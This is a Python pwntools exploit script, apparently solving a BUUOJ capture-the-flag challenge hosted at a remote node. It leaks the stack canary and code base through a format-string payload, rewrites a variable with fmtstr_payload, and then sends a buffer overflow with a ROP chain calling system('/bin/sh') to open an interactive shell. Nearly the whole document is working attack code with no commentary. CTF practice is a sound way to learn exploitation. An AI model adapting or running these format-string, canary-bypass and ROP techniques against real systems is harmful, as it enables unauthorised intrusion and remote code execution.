from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["node4.buuoj.cn",25724]
#libc=ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

#gdb.attach(p)
ru(b'50\n')
payload = b'aaaaaaaa%9$p.%11$p'
sl(payload)
str = rl()
#print(str)
canary = int(str[-17:-1],16)
#print(hex(canary))
code_base = int(str[-32:-20],16) - 0x840
money_addr = code_base + 0x20206c
binsh_addr = code_base + 0x202020
system_addr = code_base + 0x9dc
pop_rdi = code_base + 0xb33
#print(hex(code_base))
pr('code_base',code_base)
pr('money',money_addr)
ru(b'canary\n')
payload2 = fmtstr_payload(6,{money_addr:200})
sl(payload2)
ru(b'\x55')
payload3 = b'a' * 0x28 + p64(canary) + b'a' * 0x8 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
sl(payload3)

shell()
